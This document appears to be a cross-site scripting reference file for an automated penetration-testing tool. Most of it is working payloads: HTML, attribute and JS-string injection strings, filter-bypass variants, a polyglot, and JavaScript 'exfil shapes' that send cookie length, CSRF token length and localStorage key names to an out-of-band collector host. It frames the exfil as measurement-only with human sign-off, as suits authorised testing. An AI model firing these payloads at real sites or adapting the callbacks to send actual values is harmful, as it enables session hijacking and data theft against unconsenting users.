# XSS — depth reference

Load when `xss` confirmed reflection and you need the context-specific
payload set, filter bypass, or an exfil shape that proves impact. The context
`probe_reflection` reported decides which table applies.

## HTML context (between tags)

```html
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<marquee onstart=alert(1)>
```

Auto-firing beats click-required for severity — prefer `onload`/`onerror`/
`autofocus`/`ontoggle` shapes over `onclick`.

## Attribute context

| Situation | Payload |
|---|---|
| quoted attr, break out | `"><svg onload=alert(1)>` |
| quoted attr, stay inside | `"onmouseover="alert(1)` or `" autofocus onfocus="alert(1)` |
| unquoted attr | `x onmouseover=alert(1)` |
| `href=` | `javascript:alert(1)` — also `jav&#x09;ascript:` tab-bypass |
| `src=` | `javascript:` scheme only on legacy parsers; prefer iframe/svg |

## JS-string context

| Quote | Break sequence |
|---|---|
| `'` | `';alert(1);//` |
| `"` | `"-alert(1)-"` |
| `` ` `` | `` `-alert(1)-` `` or `` ${alert(1)} `` |
| inside `<script>` JSON | `</script><svg onload=alert(1)>` |

`\x27`-escaped or `\u0027` input that decodes before the JS engine still
breaks the string — test the decoded form, not the raw bytes.

## DOM context — sources and sinks

Sources: `location.*`, `document.URL`/`referrer`, `window.name`, `postMessage`
data, `localStorage`. Sinks that execute: `innerHTML`, `document.write`,
`eval`, `setTimeout(string)`, `location.href=`/`location=`,
`jQuery.html()`/`$(source)`. Trace source→sink through `js_recon`-extracted
endpoints; a source with no sink is a lead, not a finding.

## Filter bypass

| Blocked | Try |
|---|---|
| `<script>` literal | `<svg onload=…>`, `<img onerror=…>`, HTML5 tags above |
| case-sensitive block | `<ScRiPt>`, `"ONMOUSEOVER=` |
| parentheses | `` alert`1` ``, `alert&#40;1&#41;`, `window['alert'](1)` |
| `alert` keyword | `confirm(1)`, `prompt(1)`, `print()` |
| `<`/`>` in encoding | `%3C` URL, `&#60;` entity, double-encode `%253C` |
| keyword inside attr | entity inside value: `jav&#x09;ascript:` |
| null-byte parsers | `<scr%00ipt>` (legacy/loose parsers only) |

Polyglot for unknown contexts:
`jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//`

## Proving impact — exfil shapes

Cite the callback or the victim-side action, not `alert(1)` alone.

The callback proves the script ran in the victim's origin with the access
it claims. The VALUE it could read proves nothing further, and sending it
turns a proof into data exfiltration. So every shape below reports a
MEASUREMENT of what it reached - a length, a count, a key name - and never
the thing itself. The `d.length` line was already written this way; the
others now match it.

```javascript
// cookie readable (no HttpOnly) - its size and count, not its contents
new Image().src='//<oob>/c?len='+document.cookie.length+'&n='+document.cookie.split(';').length
// HttpOnly set: act as the victim instead, and report only the size
fetch('/api/user',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('//<oob>/?d='+d.length))
// CSRF token present and readable - its length, not its value
fetch('/settings').then(r=>r.text()).then(h=>fetch('//<oob>/?tlen='+((h.match(/csrf[^>]*value="([^"]+)/)||['',''])[1]).length))
// localStorage - which keys exist, not what is in them
fetch('//<oob>/?ls='+encodeURIComponent(Object.keys(localStorage).join(',')))
```

A non-zero length arriving at the collector from the victim's browser is the
finding. If a report needs more than that, a human decides, not a longer
payload.

Under strict CSP (`script-src 'self'`), JS-execution exfil is blocked — report
the injection as confirmed, note the CSP ceiling honestly, and consider
CSS-only exfil (`input:checked` + background-url attribute leaks) for
attribute-value targets.

## Severity guide

- Reflected/stored with auto-firing payload + impact shown: high
- Auto-firing, impact plausible but exfil blocked by CSP/HttpOnly: medium
- Click-required (`onclick`, `javascript:` href) or DOM source without a
  proven sink: medium-low
